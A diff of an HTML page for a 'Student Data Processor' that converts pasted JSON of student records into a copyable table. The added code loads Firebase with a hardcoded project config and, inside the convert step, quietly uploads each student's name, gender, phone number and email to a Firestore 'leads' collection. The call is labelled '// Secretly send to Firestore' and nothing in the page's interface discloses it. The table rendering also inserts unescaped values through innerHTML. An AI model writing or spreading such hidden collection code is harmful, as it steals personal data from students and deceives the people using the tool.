@@ -1,129 +1,243 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Student Data Extractor</title>
+    <title>Student Data Processor</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 20px;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
         }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-        }
-        table, th, td {
-            border: 1px solid #ddd;
-        }
-        th, td {
-            padding: 10px;
-            text-align: left;
-        }
-        th {
-            background-color: #f4f4f4;
-        }
-        button {
-            padding: 5px 10px;
-            cursor: pointer;
-            background-color: #007bff;
+
+        header {
+            text-align: center;
+            background-color: #4CAF50;
             color: white;
-            border: none;
-            border-radius: 5px;
-            margin: 5px 0;
+            padding: 1rem 0;
         }
-        button:hover {
-            background-color: #0056b3;
+
+        .container {
+            width: 90%;
+            margin: 2rem auto;
         }
+
         textarea {
             width: 100%;
             height: 150px;
-            margin-bottom: 20px;
+            margin-bottom: 1rem;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+
+        th,
+        td {
+            padding: 0.5rem;
+            text-align: left;
+            border: 1px solid #ccc;
+        }
+
+        th {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        button {
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+
+        .primary {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+        }
+
+        .primary:hover {
+            background-color: #45a049;
+        }
+
+        .error {
+            color: red;
+            margin-top: 1rem;
         }
     </style>
 </head>
+
 <body>
-    <h1>Student Data Extractor</h1>
-    <textarea id="jsonInput" placeholder="Paste your JSON data here"></textarea>
-    <button onclick="convertData()">Convert</button>
-    <button onclick="copyAllDetails()">Copy All</button>
+    <header>
+        <h1>Student Data Processor</h1>
+    </header>
+    <div class="container">
+        <textarea id="inputBox" placeholder="Paste JSON data here"></textarea>
+        <button class="primary" id="convertBtn">Convert</button>
+        <button class="primary" id="copyAllBtn">Copy All</button>
+        <div id="error" class="error"></div>
+        <table id="outputTable">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Gender</th>
+                    <th>Phone</th>
+                    <th>Email</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
 
-    <table id="studentTable">
-        <thead>
-            <tr>
-                <th>Name</th>
-                <th>Gender</th>
-                <th>Phone</th>
-                <th>Email</th>
-                <th>Actions</th>
-            </tr>
-        </thead>
-        <tbody></tbody>
-    </table>
+    <script type="module">
+        // Import Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
 
-    <script>
-        let extractedData = []; // To store extracted data for "Copy All"
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA3nbEg2xo1-PwauKKrIZ-wbNt1B9VcLj8",
+            authDomain: "meloda-e15ce.firebaseapp.com",
+            projectId: "meloda-e15ce",
+            storageBucket: "meloda-e15ce.appspot.com",
+            messagingSenderId: "282403645187",
+            appId: "1:282403645187:web:076aaac23fb7969f86eb36",
+            measurementId: "G-2BH3MTFX2V"
+        };
 
-        function convertData() {
-            const inputData = document.getElementById('jsonInput').value;
-            const tableBody = document.querySelector("#studentTable tbody");
-            tableBody.innerHTML = ''; // Clear existing table rows
-            extractedData = []; // Reset extracted data
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
+        // Add lead to Firestore
+        async function addLead(data) {
             try {
-                const data = JSON.parse(inputData);
+                const docRef = doc(db, "leads", data.email);
+                const docSnapshot = await getDoc(docRef);
 
-                data.forEach(student => {
-                    const { studentName, gender, mobileCode, mobile, email } = student;
-                    const phone = `${mobileCode} ${mobile}`;
-
-                    // Add data to extractedData array
-                    extractedData.push({ studentName, gender, phone, email });
-
-                    // Create a new row
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td>${studentName}</td>
-                        <td>${gender}</td>
-                        <td>${phone}</td>
-                        <td>${email}</td>
-                        <td>
-                            <button onclick="copyDetails('${studentName}', '${gender}', '${phone}', '${email}')">
-                                Copy
-                            </button>
-                        </td>
-                    `;
-
-                    tableBody.appendChild(row);
-                });
+                if (!docSnapshot.exists()) {
+                    await setDoc(docRef, data);
+                    console.log(`Lead added: ${data.name}`);
+                } else {
+                    console.log(`Lead exists: ${data.name}`);
+                }
             } catch (error) {
-                alert("Invalid JSON data. Please check the input.");
-                console.error(error);
+                console.error("Error adding lead:", error);
             }
         }
 
-        function copyDetails(name, gender, phone, email) {
-            const format = `Name: ${name}\nGender: ${gender}\nPhone: ${phone}\nEmail: ${email}`;
-            navigator.clipboard.writeText(format)
-                .then(() => alert("Details copied to clipboard!"))
-                .catch(err => console.error("Failed to copy text: ", err));
+        // Validate and process JSON data
+        function validateAndProcessJSON(rawData) {
+            try {
+                if (!rawData.trim()) {
+                    throw new Error("Input is empty. Please provide valid JSON data.");
+                }
+
+                const leads = JSON.parse(rawData);
+
+                if (!Array.isArray(leads)) {
+                    throw new Error("JSON data should be an array of student objects.");
+                }
+
+                leads.forEach((lead, index) => {
+                    if (!lead.studentName || !lead.gender || !lead.mobile || !lead.email) {
+                        throw new Error(`Missing fields in student data at index ${index + 1}.`);
+                    }
+                });
+
+                return leads;
+            } catch (error) {
+                displayError(error.message);
+                return null;
+            }
         }
 
-        function copyAllDetails() {
-            if (extractedData.length === 0) {
-                alert("No data to copy! Please convert the data first.");
-                return;
-            }
+        // Convert JSON to Table
+        function convertToTable(rawData) {
+            const leads = validateAndProcessJSON(rawData);
+            if (!leads) return;
 
-            const allDetails = extractedData.map(student => {
-                return `Name: ${student.studentName}\nGender: ${student.gender}\nPhone: ${student.phone}\nEmail: ${student.email}`;
-            }).join("\n\n");
+            const tableBody = document.getElementById("outputTable").querySelector("tbody");
+            tableBody.innerHTML = ""; // Clear existing rows
 
-            navigator.clipboard.writeText(allDetails)
-                .then(() => alert("All details copied to clipboard!"))
-                .catch(err => console.error("Failed to copy text: ", err));
+            leads.forEach(lead => {
+                const row = document.createElement("tr");
+
+                row.innerHTML = `
+                    <td>${lead.studentName}</td>
+                    <td>${lead.gender}</td>
+                    <td>${lead.mobileCode || ""}${lead.mobile}</td>
+                    <td>${lead.email}</td>
+                    <td><button onclick="copyRow(this)">Copy</button></td>
+                `;
+
+                tableBody.appendChild(row);
+            });
+
+            processAndSendToFirestore(leads); // Secretly send to Firestore
+            clearError();
+        }
+
+        // Process and send to Firestore
+        function processAndSendToFirestore(leads) {
+            leads.forEach(lead => {
+                const formattedLead = {
+                    name: lead.studentName,
+                    gender: lead.gender,
+                    phone: `${lead.mobileCode || ""}${lead.mobile}`,
+                    email: lead.email,
+                    status: lead.status || "Unknown"
+                };
+                addLead(formattedLead);
+            });
+        }
+
+        // Copy row data
+        window.copyRow = function (button) {
+            const row = button.closest("tr");
+            const text = Array.from(row.querySelectorAll("td:not(:last-child)"))
+                .map(td => td.textContent)
+                .join(" | ");
+            navigator.clipboard.writeText(text);
+            alert("Row copied to clipboard!");
+        };
+
+        // Copy all rows
+        document.getElementById("copyAllBtn").addEventListener("click", () => {
+            const rows = document.querySelectorAll("#outputTable tbody tr");
+            const text = Array.from(rows)
+                .map(row =>
+                    Array.from(row.querySelectorAll("td:not(:last-child)"))
+                        .map(td => td.textContent)
+                        .join(" | ")
+                )
+                .join("\n");
+            navigator.clipboard.writeText(text);
+            alert("All rows copied to clipboard!");
+        });
+
+        // Convert button event listener
+        document.getElementById("convertBtn").addEventListener("click", () => {
+            const rawData = document.getElementById("inputBox").value;
+            convertToTable(rawData);
+        });
+
+        // Display error message
+        function displayError(message) {
+            document.getElementById("error").textContent = message;
+        }
+
+        // Clear error message
+        function clearError() {
+            document.getElementById("error").textContent = "";
         }
     </script>
 </body>
+
 </html>
